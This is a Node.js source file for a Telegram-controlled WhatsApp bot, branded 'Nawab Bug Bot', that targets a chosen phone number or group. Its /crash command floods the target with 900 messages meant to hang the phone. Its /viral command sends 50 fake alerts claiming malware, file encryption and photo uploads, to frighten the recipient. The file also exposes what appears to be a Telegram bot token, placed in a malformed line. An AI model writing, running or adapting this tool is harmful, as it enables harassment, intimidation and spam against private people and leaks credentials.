require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');

const telegramToken = process.env.8337876876:AAHgbiOTFYC1Vn7leS__r2cpoCaXUpU3C0k;
const bot = new TelegramBot(telegramToken, { polling: true });

const whatsappClient = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: { 
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox'] 
    }
});

let phoneNumberToCrash = null;
let groupChatId = null;

whatsappClient.on('qr', (qr) => {
    console.log('🔥 QR Code Generated... Scan karein!');
    qrcode.generate(qr, { small: true });
});

whatsappClient.on('ready', () => {
    console.log('👑 NAWAB BUG BOT IS READY TO CRASH! 🚀');
});


bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const caption = `
👑 *NAWAB BUG BOT (HEAVY EDITION)* 👑
💻 Developer: *Nawab Zada Hacker*

⚡ *Powerful Features:*
1. /link - Target Number Set Karein
2. /group - Group Select Karein
3. /crash - **MASSIVE FLOOD ATTACK** (Phone Hang!)
4. /viral - **VIRUS SIMULATION** (Fake Alert)
5. /status - Check Power

🔥 *100% Working & Unlimited* 🔥
    `;
    bot.sendMessage(chatId, caption, { parse_mode: 'Markdown' });
});

bot.onText(/\/link/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "📲 Target Number bhejein with Country Code (e.g., 923001234567)...");
    
    const filter = (message) => message.text && !message.text.startsWith('/');
    bot.once('message', function onNumber(message) {
        if (!filter(message)) return;
        
        phoneNumberToCrash = message.text.trim().replace(/[^0-9]/g, ''); 
        bot.sendMessage(chatId, `🎯 *Target Locked:* ${phoneNumberToCrash}\nAb /crash ya /viral use karein!`);
    }, { once: true });
});

bot.onText(/\/group/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "👥 Group ka ID ya Name bhejein...");
    
    const filter = (message) => message.text && !message.text.startsWith('/');
    bot.once('message', function onGroup(message) {
        if (!filter(message)) return;
        
        groupChatId = message.text.trim(); // Simple string match, advanced ke liye ID chahiye
        bot.sendMessage(chatId, `👥 *Group Selected:* ${groupChatId}`);
    }, { once: true });
});

bot.onText(/\/crash/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (!phoneNumberToCrash && !groupChatId) {
        return bot.sendMessage(chatId, "⚠️ Pehle /link ya /group se target set karein!");
    }

    bot.sendMessage(chatId, "🔥 *INITIATING MASSIVE FLOOD ATTACK...* 🌊");
    
    // Target decide karein
    const target = phoneNumberToCrash ? `${phoneNumberToCrash}@s.whatsapp.net` : groupChatId;
    
    try {
        for (let i = 0; i < 900; i++) {
            const messages = [
                "💀 BUG DETECTED 💀",
                "🔥 SYSTEM OVERLOAD 🔥",
                "☠️ NAWAB HACKED YOU ☠️",
                "📱 PHONE CRASHING... 📱",
                "⚠️ VIRUS UPLOADING ⚠️",
                "💾 MEMORY FULL 💾",
                "🚀 LAUNCHING MISSILE 🚀"
            ];
            
            const randomMsg = messages[Math.floor(Math.random() * messages.length)];
            
            await whatsappClient.sendMessage(target, randomMsg);
            
            if (i % 10 === 0) await new Promise(r => setTimeout(r, 100)); 
        }

        bot.sendMessage(chatId, `✅ *SUCCESS!* ${target} ko 900 messages se flood kar diya.\nAb phone hang hoga! 📵`);

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Attack failed. Check connection.");
    }
});

bot.onText(/\/viral/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (!phoneNumberToCrash) {
        return bot.sendMessage(chatId, "⚠️ Pehle /link se target set karein!");
    }

    bot.sendMessage(chatId, "🦠 *Deploying Fake Virus Alert...* 🦠");
    
    const target = `${phoneNumberToCrash}@s.whatsapp.net`;
    
    try {
        const virusMessages = [
            "⚠️ *WARNING*: Malware Detected!",
            "🔴 *CRITICAL*: Storage Full!",
            "💀 *Nawab Bug* is eating your RAM...",
            "📤 Uploading Photos to Cloud...",
            "🔐 Encrypting Files... 99%..."
        ];

        for (let i = 0; i < 50; i++) {
            await whatsappClient.sendMessage(target, virusMessages[i % virusMessages.length]);
        }

        bot.sendMessage(chatId, `✅ *Virus Deployed!* ${phoneNumberToCrash} ke phone par fake alerts aa rahe honge.`);

    } catch (error) {
        console.error(error);
    }
});

bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    const isConnected = whatsappClient.info ? "Connected ✅" : "Connecting... ⏳";
    bot.sendMessage(chatId, `🤖 *Nawab Bug Bot Status* 🤖\n👨‍💻 Dev: Nawab Zada Hacker\n📡 WhatsApp: ${isConnected}\n🎯 Target: ${phoneNumberToCrash || 'None'}\n👥 Group: ${groupChatId || 'None'}`);
});

bot.startPolling();
